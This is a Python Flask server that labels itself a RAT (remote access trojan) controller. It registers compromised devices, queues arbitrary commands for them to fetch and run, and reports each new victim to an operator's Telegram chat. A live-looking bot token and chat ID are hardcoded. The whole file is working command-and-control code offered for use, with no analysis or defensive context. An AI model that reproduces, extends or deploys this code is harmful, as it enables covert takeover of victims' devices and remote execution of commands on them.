from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# ========== Configuration ==========
BOT_TOKEN = '7814616506:AAHixHaptUH9hPcLq3awDS3mqHGScs3y9Yc'
OWNER_CHAT_ID = '7554840326'
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# ========== In-Memory Database ==========
connected_devices = {}  # device_id -> {'name': ..., 'commands': []}

# ========== Routes ==========

@app.route('/')
def home():
    return "RAT Flask Server Running!"

@app.route('/connect', methods=['POST'])
def connect_device():
    data = request.json
    device_id = data.get('device_id')
    name = data.get('name')

    if not device_id or not name:
        return jsonify({'error': 'Missing device_id or name'}), 400

    connected_devices[device_id] = {'name': name, 'commands': []}

    # Notify the Telegram owner
    msg = f"✅ New device connected:\n• Name: {name}\n• ID: {device_id}"
    requests.post(TELEGRAM_API, data={
        'chat_id': OWNER_CHAT_ID,
        'text': msg
    })

    return jsonify({'status': 'connected', 'device_id': device_id})

@app.route('/devices', methods=['GET'])
def list_devices():
    return jsonify({device_id: data['name'] for device_id, data in connected_devices.items()})

@app.route('/command/<device_id>', methods=['POST'])
def send_command(device_id):
    command = request.json.get('command')
    if not command:
        return jsonify({'error': 'Missing command'}), 400

    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404

    connected_devices[device_id]['commands'].append(command)
    return jsonify({'status': 'command added'})

@app.route('/command/<device_id>', methods=['GET'])
def fetch_command(device_id):
    if device_id not in connected_devices:
        return jsonify({'error': 'Device not found'}), 404

    cmds = connected_devices[device_id]['commands']
    connected_devices[device_id]['commands'] = []  # Clear after fetching
    return jsonify(cmds)

# ========== Main ==========
if __name__ == '__main__':
    app.run()
